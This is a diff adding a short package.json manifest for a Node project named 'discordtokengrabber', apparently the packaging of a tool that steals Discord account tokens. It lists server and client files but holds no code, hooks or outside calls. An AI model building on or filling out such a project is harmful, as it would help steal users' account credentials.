@@ -1,0 +1,17 @@
+{
+    "name": "discordtokengrabber",
+    "author": "k4itrun",
+    "version": "1.0.0",
+    "description": "*",
+    "license": "ISC",
+    "scripts": {},
+    "files": [
+        "./server/index.js",
+        "./client/index.js"
+    ],
+    "engines": {
+      "node": "20.x"
+    }, "keywords": ["token","aurathemes"],
+    "dependencies": {},
+    "devDependencies": {}
+  }
